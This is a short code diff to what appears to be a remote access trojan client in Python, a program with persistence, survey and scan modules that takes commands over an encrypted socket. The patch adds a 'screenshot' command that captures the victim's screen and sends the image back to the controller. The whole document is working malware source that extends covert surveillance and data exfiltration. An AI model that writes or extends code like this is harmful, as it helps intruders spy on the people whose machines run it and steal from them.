@@ -18,6 +18,7 @@ from core import persistence
 from core import scan
 from core import survey
 from core import toolkit
+from core import screenshot
 
 
 PLAT_TYPE = sys.platform
@@ -94,6 +95,12 @@ def main():
         elif cmd == 'scan':
             results = scan.single_host(action)
             s.send(crypto.AES_encrypt(results, dh_key))
+        
+        # take a screenshot
+        elif cmd == 'screenshot':
+            results = screenshot.take_screenshot('screenshot.jpg')
+            s.send(crypto.AES_encrypt(results, dh_key))
+
 
 
 if __name__ == '__main__':
